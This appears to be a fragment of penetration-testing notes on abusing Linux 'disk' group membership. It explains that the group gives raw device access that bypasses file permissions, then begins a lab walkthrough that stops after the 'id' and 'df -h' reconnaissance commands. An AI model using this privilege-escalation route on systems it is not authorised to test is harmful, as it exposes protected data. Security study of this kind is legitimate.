# Disk

The **`disk`** group in Linux is a **privileged system group** intended to grant **access to** **raw disk devices**, like `/dev/sda`, `/dev/sdb`, etc. It allows users to perform low-level operations on storage devices, such as partitioning, formatting, mounting/unmounting, etc.&#x20;

Membership in the `disk` group is highly sensitive â€” users with this access can **read or modify any data on the system**, bypassing file permissions entirely.

```bash
# Confirm group membership
ian@DANTE-NIX07:~$ id
uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk)

# Identify the root fine system (/)
ian@DANTE-NIX07:~$ df -h
